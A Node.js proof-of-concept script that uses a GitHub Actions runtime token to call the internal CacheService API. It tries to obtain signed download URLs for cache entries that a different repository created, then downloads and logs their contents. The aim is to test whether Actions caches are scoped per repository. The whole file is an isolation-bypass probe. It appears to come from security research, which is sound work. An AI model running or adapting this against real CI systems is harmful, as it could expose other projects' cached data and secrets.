const https = require('https');
const RESULTS_URL = process.env.ACTIONS_RESULTS_URL || '';
const RUNTIME_TOKEN = process.env.ACTIONS_RUNTIME_TOKEN || '';
const ORCHESTRATION_ID = process.env.ACTIONS_ORCHESTRATION_ID || '';
const GITHUB_REPOSITORY = process.env.GITHUB_REPOSITORY || '';

// Cache created by Zelys-DFKH/depbot-ssrf-test (v11)
const TARGET_KEY = 'probe-cross-run-scope-test-final';
const TARGET_VERSION = 'c756ff567d2be9e4ef838941a51f4f73c528d7a58effbb92bfecc5022c30a385';
// Also try v10's key
const V10_KEY = 'probe-v10-finalize-fixed';
const V10_VERSION = 'a14cbe44f4754c7935c91d1cd56f39f65180627f332662692f387a07dd449a41';

function post(host, path, body) {
  return new Promise((resolve) => {
    const s = JSON.stringify(body);
    const r = https.request({
      hostname: host, path, method: 'POST',
      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(s) }
    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d })); });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.write(s); r.end();
  });
}

async function main() {
  if (!RESULTS_URL || !RUNTIME_TOKEN) { console.log('Missing env'); return; }
  const host = new URL(RESULTS_URL).hostname;
  console.log('=== V12: Cross-repo cache scope test ===');
  console.log('THIS REPO:', GITHUB_REPOSITORY);
  console.log('Target cache FROM: Zelys-DFKH/depbot-ssrf-test');
  console.log('This run UUID:', ORCHESTRATION_ID.split('.')[0]);

  console.log('\n=== TEST: Read v11 cache (from depbot-ssrf-test) in cache-scope-probe ===');
  const r1 = await post(host, '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', {
    key: TARGET_KEY, version: TARGET_VERSION,
  });
  console.log('[CROSS-REPO T1] v11 key:', r1.status, '|', r1.body);
  if (r1.status === 200) {
    try {
      const p = JSON.parse(r1.body);
      if (p.ok && p.signed_download_url) {
        console.log('\n!!! CRITICAL: CROSS-REPO CACHE ACCESS CONFIRMED !!!');
        console.log('Read cache from depbot-ssrf-test while running in cache-scope-probe!');
        console.log('Matched key:', p.matched_key);
        // Read the content
        const https2 = require('https');
        const u = new URL(p.signed_download_url);
        const content = await new Promise((resolve) => {
          const req = https2.request({ hostname: u.hostname, path: u.pathname + u.search, method: 'GET' },
            (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve(d.substring(0,200))); });
          req.on('error', e => resolve('ERR: ' + e.message));
          req.end();
        });
        console.log('Cache content:', content);
      } else {
        console.log('ok:false — cross-repo read blocked (cache IS repo-scoped)');
      }
    } catch(e) {}
  }

  // Also try v10 key
  const r2 = await post(host, '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', {
    key: V10_KEY, version: V10_VERSION,
  });
  console.log('\n[CROSS-REPO T2] v10 key:', r2.status, '|', r2.body.substring(0, 200));
}
main().catch(e => console.log('Fatal:', e.message));
